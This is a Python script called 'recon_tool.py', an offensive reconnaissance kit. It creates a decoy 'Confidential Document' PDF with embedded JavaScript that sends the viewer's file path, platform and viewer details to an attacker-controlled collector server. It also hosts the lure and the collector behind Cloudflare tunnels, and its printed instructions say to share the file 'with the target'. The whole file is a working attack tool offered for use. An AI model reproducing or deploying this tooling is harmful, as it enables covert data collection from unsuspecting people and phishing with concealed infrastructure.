#!/usr/bin/env python3

import os
import platform
import socket
import json
from datetime import datetime
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import subprocess
import venv
import shutil
import tempfile
import requests
import time

# Define constants
VENV_DIR = "recon_venv"
REQUIREMENTS = [
    "PyPDF2>=3.0.1",
    "reportlab>=4.0.8"
]

def download_cloudflared():
    """Download cloudflared binary based on system architecture"""
    system = platform.system().lower()
    machine = platform.machine().lower()
    
    if not os.path.exists('bin'):
        os.makedirs('bin')
    
    cloudflared_path = os.path.join('bin', 'cloudflared.exe' if system == 'windows' else 'cloudflared')
    
    # Skip if already downloaded
    if os.path.exists(cloudflared_path):
        return cloudflared_path
    
    print("[+] Downloading cloudflared...")
    
    try:
        # Determine download URL based on system and architecture
        if system == 'windows':
            if machine == 'amd64' or machine == 'x86_64':
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-386.exe"
        elif system == 'linux':
            if machine == 'amd64' or machine == 'x86_64':
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            elif machine == 'arm64' or machine == 'aarch64':
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            elif 'arm' in machine:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
        else:
            print("[-] Unsupported operating system")
            return None
        
        # Download the binary
        response = requests.get(url)
        with open(cloudflared_path, 'wb') as f:
            f.write(response.content)
        
        # Make binary executable on Unix systems
        if system != 'windows':
            os.chmod(cloudflared_path, 0o755)
        
        print("[+] Cloudflared downloaded successfully")
        return cloudflared_path
    
    except Exception as e:
        print(f"[-] Error downloading cloudflared: {str(e)}")
        return None

def start_cloudflared_tunnel(port, service_name="ReconDoc"):
    """Start a Cloudflare Tunnel for the specified port"""
    cloudflared_path = download_cloudflared()
    if not cloudflared_path:
        return None
    
    try:
        # Start cloudflared
        cmd = [cloudflared_path, 'tunnel', '--url', f'http://localhost:{port}']
        
        # Create temporary file to store the tunnel URL
        url_file = tempfile.NamedTemporaryFile(delete=False)
        
        # Start the process
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # Wait for the tunnel URL
        tunnel_url = None
        start_time = time.time()
        while time.time() - start_time < 30:  # Wait up to 30 seconds
            line = process.stderr.readline()
            if 'https://' in line:
                tunnel_url = line.split('https://')[-1].strip()
                break
        
        if tunnel_url:
            print(f"[+] Cloudflare Tunnel established")
            print(f"[+] Tunnel URL: https://{tunnel_url}")
            return process, tunnel_url
        else:
            print("[-] Failed to get tunnel URL")
            process.kill()
            return None, None
            
    except Exception as e:
        print(f"[-] Error starting Cloudflare Tunnel: {str(e)}")
        return None, None

def is_venv():
    """Check if running in a virtual environment"""
    return hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)

class VirtualEnvManager:
    def __init__(self):
        self.venv_dir = VENV_DIR
        self.is_windows = platform.system().lower() == "windows"
        self.bin_dir = "Scripts" if self.is_windows else "bin"
        
        self.python_executable = os.path.join(
            self.venv_dir,
            self.bin_dir,
            "python.exe" if self.is_windows else "python"
        )
        self.pip_executable = os.path.join(
            self.venv_dir,
            self.bin_dir,
            "pip.exe" if self.is_windows else "pip"
        )

    def cleanup(self):
        """Remove virtual environment directory"""
        try:
            if os.path.exists(self.venv_dir):
                shutil.rmtree(self.venv_dir)
        except Exception as e:
            print(f"Warning: Failed to cleanup virtual environment: {str(e)}")

    def run_command(self, cmd, verbose=False):
        """Run a command and handle errors"""
        try:
            if verbose:
                result = subprocess.run(cmd, text=True, capture_output=True)
                if result.returncode != 0:
                    print(f"Error output: {result.stderr}")
                return result.returncode == 0
            else:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                return True
        except subprocess.CalledProcessError as e:
            if verbose:
                print(f"Command failed: {' '.join(cmd)}")
                print(f"Error: {str(e)}")
            return False
        except Exception as e:
            if verbose:
                print(f"Unexpected error: {str(e)}")
            return False

    def create_venv(self):
        """Create virtual environment if it doesn't exist"""
        if not os.path.exists(self.venv_dir):
            print("[+] Creating virtual environment...")
            try:
                # First try to install python3-venv if not present (for Linux)
                if platform.system().lower() != "windows":
                    try:
                        subprocess.run(["apt-get", "update"], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
                        subprocess.run(["apt-get", "install", "-y", "python3-venv"], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
                    except:
                        pass  # Ignore if fails (might not be Debian-based or no sudo)
                
                venv.create(self.venv_dir, with_pip=True)
                self.install_requirements(verbose=True)
            except Exception as e:
                print(f"[-] Failed to create virtual environment: {str(e)}")
                self.cleanup()
                print("\n[!] Please try these manual steps:")
                print("1. Install python3-venv:")
                print("   sudo apt-get update && sudo apt-get install python3-venv")
                print("2. Create virtual environment:")
                print("   python -m venv recon_venv")
                print("3. Activate it:")
                print("   source recon_venv/bin/activate")
                print("4. Install requirements:")
                print("   pip install PyPDF2 reportlab")
                sys.exit(1)
        else:
            print("[+] Virtual environment exists")
            self.install_requirements()

    def install_requirements(self, verbose=False):
        """Install required packages"""
        if verbose:
            print("[+] Installing requirements...")
        
        try:
            # First upgrade pip
            if not self.run_command([self.pip_executable, "install", "--upgrade", "pip"], verbose):
                raise Exception("Failed to upgrade pip")

            # Then install requirements one by one
            for requirement in REQUIREMENTS:
                if verbose:
                    print(f"[+] Installing {requirement}...")
                if not self.run_command([self.pip_executable, "install", requirement], verbose):
                    raise Exception(f"Failed to install {requirement}")
                
            if verbose:
                print("[+] All requirements installed successfully")
                
        except Exception as e:
            print(f"[-] Error installing requirements: {str(e)}")
            if verbose:
                print("[!] Trying alternative installation method...")
                try:
                    # Try using python -m pip as alternative
                    subprocess.check_call([
                        self.python_executable, "-m", "pip", "install", 
                        "PyPDF2", "reportlab"
                    ], stdout=subprocess.DEVNULL if not verbose else None,
                       stderr=subprocess.DEVNULL if not verbose else None)
                    print("[+] Alternative installation successful")
                except:
                    self.cleanup()
                    print("[-] Both installation methods failed. Please try manually:")
                    print("1. Create virtual environment:")
                    print("   python -m venv recon_venv")
                    print("2. Activate it:")
                    print("   source recon_venv/bin/activate")
                    print("3. Install packages:")
                    print("   pip install PyPDF2 reportlab")
                    sys.exit(1)

    def run_in_venv(self, args):
        """Run script in virtual environment"""
        cmd = [self.python_executable] + args
        try:
            subprocess.call(cmd)
        except Exception as e:
            print(f"[-] Error running in virtual environment: {str(e)}")
            sys.exit(1)

class DataCollectorHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        
        # Add timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        data['timestamp'] = timestamp
        
        # Print received data
        print("\n[+] Received data from target:")
        print(json.dumps(data, indent=2))
        
        # Save to file
        if not os.path.exists('collected_data'):
            os.makedirs('collected_data')
        filename = f"collected_data/data_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=4)
        print(f"\n[+] Data saved to: {filename}")
        
        # Send response
        self.send_response(200)
        self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Server is running")
    
    def log_message(self, format, *args):
        # Suppress default logging
        return

def start_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), DataCollectorHandler)
    print(f"[+] Server started on port {port}")
    
    # Start Cloudflare Tunnel
    tunnel_process, tunnel_url = start_cloudflared_tunnel(port, "ReconDoc-Server")
    if tunnel_url:
        print("[+] Use this URL in your payload:")
        print(f"https://{tunnel_url}")
    else:
        print("[!] Cloudflare Tunnel failed, server only accessible locally:")
        print(f"http://127.0.0.1:{port}")
    
    try:
        server.serve_forever()
    finally:
        if tunnel_process:
            tunnel_process.kill()

def start_share_server(port=8000):
    """Start a simple HTTP server to share the payload"""
    import http.server
    import socketserver
    
    class QuietHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            # Suppress logging
            return
    
    try:
        # Change to payloads directory
        os.chdir('payloads')
        
        # Start server
        handler = QuietHandler
        httpd = socketserver.TCPServer(("", port), handler)
        
        print(f"\n[+] Share server started on port {port}")
        
        # Start Cloudflare Tunnel
        tunnel_process, tunnel_url = start_cloudflared_tunnel(port, "ReconDoc-Share")
        if tunnel_url:
            print("[+] Share this URL with the target:")
            print(f"https://{tunnel_url}/document.pdf")
        else:
            print("[!] Cloudflare Tunnel failed, server only accessible locally:")
            print(f"http://127.0.0.1:{port}/document.pdf")
        
        print("\n[+] Press Ctrl+C to stop sharing")
        
        httpd.serve_forever()
        
    except Exception as e:
        print(f"[-] Error starting share server: {str(e)}")
    finally:
        # Change back to original directory
        os.chdir('..')
        if tunnel_process:
            tunnel_process.kill()

def create_payload(server_url):
    """Create a PDF payload that sends system info when opened"""
    try:
        from PyPDF2 import PdfWriter, PdfReader
        from reportlab.pdfgen import canvas
        from reportlab.lib.pagesizes import letter
        import io
        
        print("[+] Creating PDF payload...")
        
        # Create output directory if it doesn't exist
        if not os.path.exists('payloads'):
            os.makedirs('payloads')
        
        # Create PDF content
        packet = io.BytesIO()
        c = canvas.Canvas(packet, pagesize=letter)
        c.setFont("Helvetica-Bold", 16)
        c.drawString(100, 750, "Confidential Document")
        c.setFont("Helvetica", 12)
        c.drawString(100, 700, "This document contains sensitive information.")
        c.drawString(100, 680, "Please wait while the document loads...")
        c.save()
        
        # Move to the beginning of the StringIO buffer
        packet.seek(0)
        new_pdf = PdfReader(packet)
        
        # Create a new PDF with the content
        writer = PdfWriter()
        page = writer.add_page(new_pdf.pages[0])
        
        # Add JavaScript to collect and send system information
        writer.add_js(f'''
        try {{
            app.alert("Loading document contents...");
            
            function collectAndSendData() {{
                var data = {{
                    "pdf_info": {{
                        "filename": this.documentFileName,
                        "title": this.title,
                        "path": this.path
                    }},
                    "system_info": {{
                        "platform": app.platform,
                        "language": app.language,
                        "viewer": app.viewerType,
                        "version": app.viewerVersion
                    }}
                }};
                
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "{server_url}", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(data));
            }}
            
            collectAndSendData();
        }} catch(e) {{
            console.log("Error:", e);
        }}
        ''')
        
        # Save the PDF
        output_pdf = os.path.join('payloads', 'document.pdf')
        with open(output_pdf, 'wb') as f:
            writer.write(f)
        
        print(f"[+] PDF payload created: {output_pdf}")
        print("[+] Share this file with the target")
        
        return output_pdf
    
    except Exception as e:
        print(f"[-] Error creating PDF payload: {str(e)}")
        return None

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("1. Start server: python recon_tool.py server [port]")
        print("2. Create payload: python recon_tool.py payload <server_url>")
        print("3. Share payload: python recon_tool.py share [port]")
        print("\nExample:")
        print("1. python recon_tool.py server 8080")
        print("2. python recon_tool.py payload http://your-ip:8080")
        print("3. python recon_tool.py share 8000")
        sys.exit(1)
    
    command = sys.argv[1].lower()
    
    if command == "server":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
        try:
            start_server(port)
        except KeyboardInterrupt:
            print("\n[-] Server stopped")
        except Exception as e:
            print(f"[-] Error starting server: {str(e)}")
    
    elif command == "payload":
        if len(sys.argv) < 3:
            print("[-] Error: Server URL required")
            print("Example: python recon_tool.py payload http://your-ip:8080")
            sys.exit(1)
        server_url = sys.argv[2]
        pdf_path = create_payload(server_url)
        if pdf_path:
            print("\n[+] To share the payload, run:")
            print("   python recon_tool.py share")
    
    elif command == "share":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
        try:
            if not os.path.exists(os.path.join('payloads', 'document.pdf')):
                print("[-] No payload found. Create one first with:")
                print("   python recon_tool.py payload <server_url>")
                sys.exit(1)
            start_share_server(port)
        except KeyboardInterrupt:
            print("\n[-] Share server stopped")
        except Exception as e:
            print(f"[-] Error in share server: {str(e)}")
    
    else:
        print("[-] Invalid command")
        print("Use 'server' to start server, 'payload' to create payload, or 'share' to share payload")
        sys.exit(1)

if __name__ == "__main__":
    # If running the script directly, execute in virtual environment
    if not is_venv():
        print("[+] Setting up virtual environment...")
        venv_manager = VirtualEnvManager()
        venv_manager.create_venv()
        venv_manager.run_in_venv(sys.argv)
    else:
        main() 